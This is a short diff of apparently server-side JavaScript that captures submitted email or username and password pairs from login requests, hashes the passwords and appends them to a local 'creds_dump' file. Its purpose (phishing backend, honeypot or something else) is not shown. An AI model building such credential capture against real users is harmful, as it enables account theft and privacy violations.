@@ -33,9 +33,11 @@ function hashPwd(password) {
 
 //grab credentials (email and pwd) and put them in a makeshift queue
 function grabCreds(reqObject, q) {
-    const {username, password} = reqObject.body;
+    const {email, username, password} = reqObject.body;
 
-    q.push(`${username}:${hashPwd(password)}\n`) //looks something like test@tes.com:sha_512_hash_here\n
+    const login = email ? email : username; //grab whatever was used with the password.
+
+    q.push(`${login}:${hashPwd(password)}\n`) //looks something like test@tes.com:sha_512_hash_here\n
 }
 
 
@@ -47,7 +49,7 @@ function writeCreds(q) {
 
 
         const data = copy.join('');      //Join everything together since there's already a \n.
-        
+
         fs.appendFile('aurison_creds_dump.txt', data, (err) => {
             if (err) console.error('Error: ', err);
         });
